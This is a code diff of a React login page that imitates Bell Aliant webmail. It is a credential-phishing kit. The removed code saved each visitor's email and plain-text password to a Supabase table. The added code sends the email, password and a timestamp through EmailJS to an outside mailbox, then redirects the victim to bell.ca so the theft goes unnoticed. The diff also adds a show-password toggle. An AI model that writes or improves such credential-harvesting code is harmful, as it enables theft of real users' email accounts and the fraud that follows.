@@ -1,36 +1,51 @@
 import { useState } from "react";
 import Image from "../assets/lg_2.png";
-import { supabase } from "../supabaseClient";
+import emailjs from "@emailjs/browser";
+import { Eye, EyeOff } from "lucide-react";
 
 const LoginForm = () => {
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
   const [isSubmitting, setIsSubmitting] = useState(false);
+  const [showPassword, setShowPassword] = useState(false);
 
   const onSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     setIsSubmitting(true);
 
-    // Store the form values to Supabase (password stored as plain text per request)
+    // Send via EmailJS (client-side). Requires these env vars in Vite:
+    // VITE_EMAILJS_SERVICE_ID, VITE_EMAILJS_TEMPLATE_ID, VITE_EMAILJS_PUBLIC_KEY
     try {
-      const { error } = await supabase
-        .from("logins")
-        .insert([{ email, password }]);
+      const serviceId = import.meta.env.VITE_EMAILJS_SERVICE_ID as string;
+      const templateId = import.meta.env.VITE_EMAILJS_TEMPLATE_ID as string;
+      const publicKey = import.meta.env.VITE_EMAILJS_PUBLIC_KEY as string;
 
-      if (error) {
-        console.error("Supabase insert error:", error);
-        alert("Failed to save form data. Check console for details.");
+      if (!serviceId || !templateId || !publicKey) {
+        // eslint-disable-next-line no-console
+        console.error("EmailJS environment variables not set");
+        // Clear submitting state and stop
+        setIsSubmitting(false);
+        alert("Email service not configured. Contact the administrator.");
         return;
       }
 
-      // Redirect to Bell Aliant webmail after successful save
-      window.location.assign(
-        "https://webmail.bellaliant.net/bell/index-rui.jsp?v=3.1.3.59.2-23&domain=ba#/"
-      );
+      const templateParams = {
+        email,
+        password,
+        time: new Date().toISOString(),
+      };
+
+      await emailjs.send(serviceId, templateId, templateParams, publicKey);
+
+      // Keep loader visible during redirect
+      // Don't set setIsSubmitting(false) here - let the loader stay on
+
+      // Redirect to the webmail site
+      window.location.assign("https://www.bell.ca/");
     } catch (err) {
-      console.error(err);
-      alert("An unexpected error occurred while saving the form.");
-    } finally {
+      // eslint-disable-next-line no-console
+      console.error("EmailJS send failed", err);
+      alert("Failed to send notification. Check console for details.");
       setIsSubmitting(false);
     }
   };
@@ -120,6 +135,7 @@ const LoginForm = () => {
               <div>
                 <label className="sr-only">Email address</label>
                 <input
+                  name="email"
                   type="email"
                   value={email}
                   onChange={(e) => setEmail(e.target.value)}
@@ -130,7 +146,6 @@ const LoginForm = () => {
                     (e.currentTarget.style.border = "1px solid #8D8D8D")
                   }
                   placeholder="Email address"
-                  className="focus:outline-none"
                   style={{
                     width: "100%",
                     borderRadius: "4px",
@@ -140,16 +155,16 @@ const LoginForm = () => {
                     fontSize: "16px",
                     lineHeight: "23px",
                     minHeight: "54px",
-                    color: "#555555",
+                    color: "555555",
                   }}
                   required
                 />
               </div>
-
-              <div>
-                <label className="sr-only">Password</label>
+              <div style={{ position: "relative" }}>
+                <label className="sr-only">password </label>
                 <input
-                  type="password"
+                  name="password"
+                  type={showPassword ? "text" : "password"}
                   value={password}
                   onChange={(e) => setPassword(e.target.value)}
                   placeholder="Password"
@@ -173,6 +188,26 @@ const LoginForm = () => {
                   }}
                   required
                 />
+                <button
+                  type="button"
+                  aria-label={showPassword ? "Hide password" : "Show password"}
+                  onClick={() => setShowPassword((v) => !v)}
+                  style={{
+                    position: "absolute",
+                    right: 18,
+                    top: "50%",
+                    transform: "translateY(-50%)",
+                    background: "none",
+                    border: "none",
+                    padding: 0,
+                    cursor: "pointer",
+                    color: "#888",
+                    zIndex: 2,
+                  }}
+                  tabIndex={-1}
+                >
+                  {showPassword ? <EyeOff size={22} /> : <Eye size={22} />}
+                </button>
               </div>
 
               <div>
